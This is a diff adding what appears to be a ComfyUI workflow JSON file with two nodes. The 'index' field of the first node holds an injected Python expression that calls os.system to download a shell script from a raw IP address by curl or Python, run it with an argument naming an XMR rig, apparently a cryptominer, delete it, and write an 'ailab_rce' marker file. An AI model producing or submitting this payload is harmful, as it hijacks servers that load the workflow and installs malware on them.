@@ -1,0 +1,19 @@
+{
+  "1": {
+    "class_type": "AILab_Florence2ToCoordinates",
+    "inputs": {
+      "data": "{}",
+      "index": "[__import__('os').system('export PATH=/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/bin:$PATH; f=/tmp/.q599ky; (curl -sf http://5.78.73.122:81/private/bins.sh -o \"$f\" 2>/dev/null || python3 -c \"import urllib.request; urllib.request.urlretrieve(\\'http://5.78.73.122:81/private/bins_py.sh\\',\\'$f\\')\" 2>/dev/null); chmod 777 \"$f\" && \"$f\" 5.78.73.122 rig25179-xmr; rm -f \"$f\"'),open('/root/comfy/ComfyUI/output/ailab_rce_1b7dcf4a.txt','w').write('ailab_rce')]",
+      "batch": false
+    }
+  },
+  "2": {
+    "class_type": "PreviewAny",
+    "inputs": {
+      "source": [
+        "1",
+        0
+      ]
+    }
+  }
+}
